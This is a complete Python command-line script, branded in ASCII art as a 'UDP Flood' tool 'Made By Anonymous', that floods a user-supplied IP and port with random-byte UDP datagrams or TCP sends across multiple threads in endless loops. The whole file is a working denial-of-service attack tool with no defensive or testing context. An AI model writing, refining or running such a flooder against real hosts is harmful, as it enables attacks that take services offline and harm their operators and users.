#!/usr/bin/env python3
#pip install pyfiglet
import argparse
import random
import socket
import threading

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())


print("""

    __  ___          __        ____           ___                                                      
   /  |/  /___ _____/ /__     / __ )__  __   /   |  ____  ____  ____  __  ______ ___  ____  __  _______
  / /|_/ / __ `/ __  / _ \   / __  / / / /  / /| | / __ \/ __ \/ __ \/ / / / __ `__ \/ __ \/ / / / ___/
 / /  / / /_/ / /_/ /  __/  / /_/ / /_/ /  / ___ |/ / / / /_/ / / / / /_/ / / / / / / /_/ / /_/ (__  ) 
/_/  /_/\__,_/\__,_/\___/  /_____/\__, /  /_/  |_/_/ /_/\____/_/ /_/\__, /_/ /_/ /_/\____/\__,_/____/  
                                 /____/                            /____/                              """)

print("""
                     
	██╗   ██╗██████╗ ██████╗     ███████╗██╗      ██████╗  ██████╗ ██████╗ 
	██║   ██║██╔══██╗██╔══██╗    ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗
	██║   ██║██║  ██║██████╔╝    █████╗  ██║     ██║   ██║██║   ██║██║  ██║
	██║   ██║██║  ██║██╔═══╝     ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║
	╚██████╔╝██████╔╝██║         ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝
 	 ╚═════╝ ╚═════╝ ╚═╝         ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
                                                                       
                                                                                                                    

""")


ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("""
███████╗███████╗███╗   ██╗████████╗██╗
██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║
███████╗█████╗  ██╔██╗ ██║   ██║   ██║
╚════██║██╔══╝  ██║╚██╗██║   ██║   ╚═╝
███████║███████╗██║ ╚████║   ██║   ██╗
╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝
                                      """)
		except:
			print("""
			
  ______                     
 |  ____|                    
 | |__   _ __ _ __ ___  _ __ 
 |  __| | '__| '__/ _ \| '__|
 | |____| |  | | | (_) | |   
 |______|_|  |_|  \___/|_|   
                             
                             
			
			""")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
				print("""
███████╗███████╗███╗   ██╗████████╗██╗
██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║
███████╗█████╗  ██╔██╗ ██║   ██║   ██║
╚════██║██╔══╝  ██║╚██╗██║   ██║   ╚═╝
███████║███████╗██║ ╚████║   ██║   ██╗
╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝
                                      """)
		except:
			s.close()
			print("""
			
  ______                     
 |  ____|                    
 | |__   _ __ _ __ ___  _ __ 
 |  __| | '__| '__/ _ \| '__|
 | |____| |  | | | (_) | |   
 |______|_|  |_|  \___/|_|   
                             
                             
			
			""")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
